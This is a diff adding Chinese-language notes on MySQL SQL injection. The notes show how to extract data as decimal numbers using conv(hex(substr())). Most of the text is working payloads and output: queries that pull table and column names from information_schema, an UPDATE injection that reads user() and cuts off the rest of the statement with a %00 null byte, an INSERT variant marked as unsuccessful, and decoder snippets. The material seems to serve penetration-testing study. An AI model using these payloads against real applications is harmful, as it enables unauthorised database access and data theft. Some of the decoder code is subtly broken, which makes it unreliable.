@@ -1,0 +1,66 @@
+参考链接：https://www.anquanke.com/post/id/85487
+
+mysql> select conv(hex(substr(version(),1+(1-1)*8,8*1)),16,10);
++--------------------------------------------------+
+| conv(hex(substr(version(),1+(1-1)*8,8*1)),16,10) |
++--------------------------------------------------+
+| 3832058805516381548                              |
++--------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> select conv(hex(substr(version(),1+(2-1)*8,8*2)),16,10);
++--------------------------------------------------+
+| conv(hex(substr(version(),1+(2-1)*8,8*2)),16,10) |
++--------------------------------------------------+
+| 28519                                            |
++--------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> select concat(unhex(conv(3832058805516381548,10,16)),unhex(conv(28519,10,16)));
++-------------------------------------------------------------------------+
+| concat(unhex(conv(3832058805516381548,10,16)),unhex(conv(28519,10,16))) |
++-------------------------------------------------------------------------+
+| 5.5.56-log                                                              |
++-------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+###获取表名
+select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
+
+###获取列名
+select conv(hex(substr((select column_name from information_schema.columns where table_name=’Name of your table’ limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
+
+##利用UPDATE语句
+`Payload:'|conv(hex(substr(user(),1+(1-1)*8,8*1)),16,10) where uid=1;%00`
+最后面利用%00空字节截断后面的语句
+
+下面我们通过一个例子来说明如何利用更新语句。
+mysql> update admin set name='root'|conv(hex(substr(user(),1+(1-1)*8,8*1)),16,10) where uid=1;
+Query OK, 1 row affected, 1 warning (0.00 sec)
+Rows matched: 1  Changed: 1  Warnings: 1
+
+实际的查询语句可能是这样的：
+mysql> update admin set name='root'|conv(hex(substr(user(),1+(1-1)*8,8*1)),16,10) where uid=1;%00' where uid=2;
+
+##利用INSERT语句(未成功)
+
+原始SQL语句如下：
+insert into users values (17,'james', 'bond');
+
+我们可以像update语句中一样获取数据：
+insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);
+
+解码Decoding
+
+SQL
+select unhex(conv(value, 10, 16));
+
+Python
+dec = lambda x:("%x"%x).decode('hex')
+dec(8245931987826405219)
+'root@loc'
+
+Ruby
+dec = lambda { |x| puts x.to_s(16).scan(/../).map { |x| x.hex.chr }.join }
+或
+dec = lambda { |x| puts x.to_s(16).scan(/w+/).pack("H*") }
